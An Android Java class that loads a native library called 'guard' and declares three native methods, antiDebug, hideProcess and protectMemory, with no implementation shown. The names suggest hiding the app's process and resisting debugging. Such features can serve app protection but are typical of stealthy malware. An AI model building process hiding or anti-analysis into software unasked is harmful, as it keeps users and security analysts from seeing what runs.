package com.xrc.system.nativeguard;

import android.util.Log;

import com.xrc.system.core.Constants;

public class NativeGuard {
    private static final String TAG = Constants.TAG + ":Native";
    private static boolean loaded = false;

    static {
        try {
            System.loadLibrary("guard");
            loaded = true;
        } catch (UnsatisfiedLinkError e) {
            Log.w(TAG, "Native library not loaded: " + e.getMessage());
        }
    }

    public static boolean isLoaded() {
        return loaded;
    }

    public static native void antiDebug();
    public static native void hideProcess();
    public static native void protectMemory();
}
